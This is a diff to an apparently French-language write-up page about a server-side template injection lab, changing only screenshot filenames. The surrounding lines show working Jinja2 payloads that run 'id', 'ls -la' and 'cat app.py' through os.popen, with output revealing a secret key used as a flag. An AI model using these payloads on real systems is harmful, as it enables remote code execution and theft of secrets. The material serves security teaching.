@@ -930,7 +930,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("id").read()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/rce2.jpg" alt="RCE via joiner — commande id exécutée avec succès" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/app4.jpg" alt="RCE via joiner — commande id exécutée avec succès" loading="lazy"></div>
       <div class="terminal-caption">RCE confirmé — <code>uid=1000(spectrax) gid=1000(spectrax) groups=1000(spectrax),10(wheel),964(docker)</code></div>
     </div>
 
@@ -948,7 +948,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("ls -la").read()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/rce3.jpg" alt="Listing du répertoire via RCE — app.py, ssti_blog.html, templates, vuln.py visibles" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/app5.jpg" alt="Listing du répertoire via RCE — app.py, ssti_blog.html, templates, vuln.py visibles" loading="lazy"></div>
       <div class="terminal-caption">Listing du répertoire de travail — <code>application1.py</code>, <code>app.py</code>, <code>ex1.py</code>, <code>ssti_blog.html</code>, <code>templates/</code>, <code>vuln.py</code></div>
     </div>
 
@@ -966,7 +966,7 @@
         <div class="t-dot t-dot-green"></div>
         <span class="terminal-bar-label">?name={{joiner.__init__.__globals__.os.popen("cat app.py").read()}}</span>
       </div>
-      <div class="img-scroll"><img src="../ssti1/app2.jpg" alt="Lecture d'app.py révélant la SECRET_KEY = MZ{SSTI_M4ST3R_2026}" loading="lazy"></div>
+      <div class="img-scroll"><img src="../ssti1/app6.jpg" alt="Lecture d'app.py révélant la SECRET_KEY = MZ{SSTI_M4ST3R_2026}" loading="lazy"></div>
       <div class="terminal-caption">Code source exfiltré — la SECRET_KEY contient le flag : <strong>MZ{SSTI_M4ST3R_2026}</strong></div>
     </div>
 
